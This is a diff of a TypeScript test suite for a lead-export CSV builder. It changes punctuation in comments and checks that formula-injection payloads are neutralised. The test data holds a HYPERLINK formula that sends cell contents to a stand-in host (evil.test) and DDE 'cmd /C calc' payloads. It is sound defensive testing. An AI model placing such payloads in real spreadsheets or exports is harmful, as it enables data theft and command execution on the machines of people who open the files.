@@ -1,6 +1,6 @@
 /**
  * The CSV is the only place a lead leaves the product, so it is the one view
- * where a missing field is unrecoverable — a sheet built from an export that
+ * where a missing field is unrecoverable, a sheet built from an export that
  * dropped the resolved company cannot get it back without re-exporting.
  *
  * Two columns, deliberately: 'Company' carries the resolved identity when the
@@ -70,11 +70,11 @@ describe('buildSelectedLeadsCsv', () => {
  *
  * The escape itself is unit-tested in `lib/csvSafe.test.ts`. These prove it is
  * wired into the file the customer actually downloads. RFC-4180 quoting does
- * NOT cover this — Excel evaluates `"=1+1"` exactly as it evaluates `=1+1` —
+ * NOT cover this (Excel evaluates `"=1+1"` exactly as it evaluates `=1+1`)
  * so a cell that merely round-trips through the parser proves nothing; every
  * assertion below is on the leading character of the raw cell.
  */
-describe('buildSelectedLeadsCsv — CSV injection', () => {
+describe('buildSelectedLeadsCsv. CSV injection', () => {
   const TRIGGERS = ['=', '+', '-', '@', '\t', '\r'] as const;
 
   /** Strip the RFC-4180 wrapper so the cell's true first character is visible. */
@@ -84,7 +84,7 @@ describe('buildSelectedLeadsCsv — CSV injection', () => {
 
   it('neutralises a payload in every untrusted column', () => {
     /* Written as a sweep rather than one test per column so that a column
-       added later without the escape fails here — the failure mode this whole
+       added later without the escape fails here, the failure mode this whole
        defence exists to prevent. */
     const csv = buildSelectedLeadsCsv(
       [
@@ -106,7 +106,7 @@ describe('buildSelectedLeadsCsv — CSV injection', () => {
       () => ['@SUM(1+1)'] as readonly string[],
     );
 
-    // Header included — a header is a cell too.
+    // Header included, a header is a cell too.
     for (const line of csv.split('\r\n')) {
       for (const cell of line.split('","')) {
         expect(TRIGGERS.some((t) => unquote(cell).startsWith(t))).toBe(false);
@@ -114,7 +114,7 @@ describe('buildSelectedLeadsCsv — CSV injection', () => {
     }
 
     const row = csv.split('\r\n')[1];
-    // Each payload survives verbatim behind its quote — defused, not dropped.
+    // Each payload survives verbatim behind its quote. Defused, not dropped.
     expect(row).toContain('\'=HYPERLINK(""https://evil.test/?""&A2,""Click"")');
     expect(row).toContain("'@SUM(1+1)*cmd|' /C calc'!A0");
     expect(row).toContain('\'-2+3+cmd|"" /C calc""!A0');
@@ -124,7 +124,7 @@ describe('buildSelectedLeadsCsv — CSV injection', () => {
 
   it('neutralises a payload in a customer-typed tag', () => {
     /* Tags are the operator's own annotations, and this is the only export
-       that carries them — the server export has no tags column at all. */
+       that carries them, the server export has no tags column at all. */
     const csv = buildSelectedLeadsCsv([lead({})], () => ['=1+1', 'warm'] as readonly string[]);
 
     expect(csv.split('\r\n')[1]).toContain("'=1+1; warm");
@@ -166,7 +166,7 @@ describe('buildSelectedLeadsCsv — CSV injection', () => {
   });
 
   it('exports an unresolved Location as an empty cell, matching the server export', () => {
-    /* `GET /leads/export` writes `chat_session.location or ""` — an empty
+    /* `GET /leads/export` writes `chat_session.location or ""`, an empty
        cell. This path went through `formatLocation`, whose "Unknown" is a word
        chosen for a table. A customer merging the two downloads got one blank
        Location and one country literally named Unknown, and a CRM import
@@ -181,7 +181,7 @@ describe('buildSelectedLeadsCsv — CSV injection', () => {
   });
 
   it('keeps a resolved location and still drops the IP the raw value carries', () => {
-    /* Only the placeholder is blanked — a real place must survive, and the
+    /* Only the placeholder is blanked, a real place must survive, and the
        visitor IP the backend stores after the `|` must not. */
     const csv = buildSelectedLeadsCsv([{ ...lead({}), location: 'Pune | 49.36.1.2' } as Lead], noTags);
     const row = csv.split('\r\n')[1];
@@ -194,7 +194,7 @@ describe('buildSelectedLeadsCsv — CSV injection', () => {
     /* Pinned so nobody "fixes" it later, and matched to `csv_safe` on the
        backend: '+91 …' starts with '+', so it picks up a quote like any other
        triggering cell. Exempting values that "look like" a phone number is not
-       an option — '+1+1' looks exactly as numeric as '+91'. */
+       an option. '+1+1' looks exactly as numeric as '+91'. */
     const csv = buildSelectedLeadsCsv([lead({ phone: '+91 98000 00000' })], noTags);
 
     expect(csv.split('\r\n')[1]).toContain("\"'+91 98000 00000\"");
